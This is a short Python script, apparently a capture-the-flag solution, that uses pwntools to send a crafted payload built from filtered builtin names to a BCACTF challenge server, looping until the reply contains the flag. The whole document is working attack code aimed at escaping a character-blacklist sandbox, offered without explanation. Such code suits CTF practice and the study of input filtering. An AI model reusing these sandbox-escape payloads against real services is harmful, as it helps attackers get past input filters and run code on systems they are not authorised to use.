from pwn import *

BANNED_CHARS = "gdvxfiyundmpnetkb/\\'\"~`!@#$%^&*.{},:;=0123456789#-_|? \t\n\r\x0b\x0c"

payload = '[locals()]'
allowed_functions = [key for key in __builtins__.__dict__.keys() if not any([i for i in BANNED_CHARS if i in key.lower()])] 

i = 1
while True:
    payload += f'+[{allowed_functions[0]}]'
    final_payload = payload.encode()

    p = remote("challs.bcactf.com", 30223)

    p.recvuntil(b"message:")
    p.sendline(final_payload)
    received = b""
    while b"Deleted!" not in received and b"flag" not in received:
        received += p.recv(4096)
    if b"flag" in received:
        print(received)
        break

    p.close()

    i += 1
